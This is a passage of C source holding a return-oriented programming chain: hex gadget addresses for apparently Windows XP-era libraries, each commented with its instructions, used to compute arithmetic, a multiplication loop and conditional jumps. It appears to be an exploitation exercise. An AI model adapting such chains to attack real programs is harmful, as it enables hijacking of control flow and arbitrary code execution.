							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move j into eax then add to c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move c into eax, then multiply by 4 [via 2 shift lefts], then move back into c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move &vars[0] into eax then add to c
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\x18\x40\x40\x00"								// 0x00404018 - &vars[0]
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move *c into g by moving c into eax, then replacing eax with [eax], the moving eax into g
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xD4\x41\x40\x00"								// 0x004041D4 - &g
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// d = *(&vars[0] + (200 + a + k)<<2)
							//	Move a into eax, then into d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB8\x41\x40\x00"								// 0x004041B8 - &a
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move 200 into edi, then add to d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xC8\x00\x00\x00"								// 0x000000C8 - imm 200
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move k into eax then add to d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move d into eax, then multiply by 4 [via 2 shift lefts], then move back into d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move &vars[0] into eax then add to d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\x18\x40\x40\x00"								// 0x00404018 - &vars[0]
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move *d into d by moving d into eax, then replacing eax with [eax], the moving eax back into d
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// e = *(&vars[0] + (300 + b + j)<<2)
							//	Move b into eax, then into e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xBC\x41\x40\x00"								// 0x004041BC - &b
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move 300 into edi, then add to e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\x2C\x01\x00\x00"								// 0x0000012C - imm 300
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move j into eax then add to e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move e into eax, then multiply by 4 [via 2 shift lefts], then move back into e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move &vars[0] into eax then add to e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\x18\x40\x40\x00"								// 0x00404018 - &vars[0]
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret
							//	Move *e into e by moving e into eax, then replacing eax with [eax], the moving eax back into e
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// Multiply: f = d * e
							// MultSetup
							// Store inp_b in temp
							//	Move inp_b into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into temp
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Store inp_b-- into inp_b
							//	Move inp_p into eax then decrement
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Store 0 into outp --> Result = 0
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xD0\x41\x40\x00"								// 0x004041D0 - &f
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;
							// MultCond
							//	if(inp_b<0) set CF by performing c+80000000
							//			Load [inp_b] into eax 
							// -------------------<MultCond stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							// -------------------<MultCond stack count = 8> --------------------------------
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							// -------------------<MultCond stack count = 15> --------------------------------
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=2;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=4;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=8;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=16;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=32;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=64;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=128;	else if(n>=0) eax=0;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultCond stack count = 24> --------------------------------
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	if(n<0) esp=esp+128=esp+4*32;	else if(n>=0) esp=esp; 
							// -------------------<MultCond stack count = 32> --------------------------------
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// -------------------<MultCond stack count = 33> --------------------------------
							// MultLogic
							//  outp (result) = outp (result) + inp_a
							//	Load [inp_a] into eax 
							// -------------------<MultLog stack count = 0> --------------------------------
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC8\x41\x40\x00"								// 0x004041C8 - &d
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			[b] = [b] + eax
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\xD0\x41\x40\x00"								// 0x004041D0 - &f
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
							// -------------------<MultLog stack count = 8> --------------------------------
							//  n--
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x18\x9F\xC5\x77"								// 0x77C59F18 - DEC EAX RETN 
							//	Store inp_b-- into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// -------------------<MultLog stack count = 20> --------------------------------
							// Loop back to MultCond
							//  esp = esp + CONST 
							"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
							"\x08\xFF\xFF\xFF"								// 0xFFFFFF08 -- amount to inc stack by
									// ^----- Jump amount = (-4)*(MultCond stack count + MultLog stack count) = (-4)*(33+20 + 3??)=-224
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// To account for FibCond adding 32 to esp
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler	
							// Store temp into inp_b
							//	Move temp into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC0\x41\x40\x00"								// 0x004041C0 - &temp
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move eax into inp_b
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xCC\x41\x40\x00"								// 0x004041CC - &e
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// h = g + f
							//	Move g into eax, then into h
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xD4\x41\x40\x00"								// 0x004041D4 - &g
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xD8\x41\x40\x00"								// 0x004041D8 - &h
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//	Move f into eax then add to h
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret
							"\xD0\x41\x40\x00"								// 0x004041D0 - &f
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x68\x1D\x90\x7C"								// 0x7C901D68 - pop ebx; ret
							"\xD8\x41\x40\x00"								// 0x004041D8 - &h
							"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// *c = h
							//  Move c into eax then move that into ecx
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xC4\x41\x40\x00"								// 0x004041C4 - &c
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							//  Move h into eax
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xD8\x41\x40\x00"								// 0x004041D8 - &h
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//  Move h (eax) into c* ([ecx])
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// k = k - 1
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
`							"\xC5\x93\x91\x7C"								// 0x7C9193C5 - dec eax; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							// Conditional
							// if(k>=0) jump; else continue;
							//	if(k<0) set CF by performing k+80000000
							//			Load [k] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB4\x41\x40\x00"								// 0x004041B4 - &k
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x28\x74\x12\x00"								// 0x00127428 - &ifTrue
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;

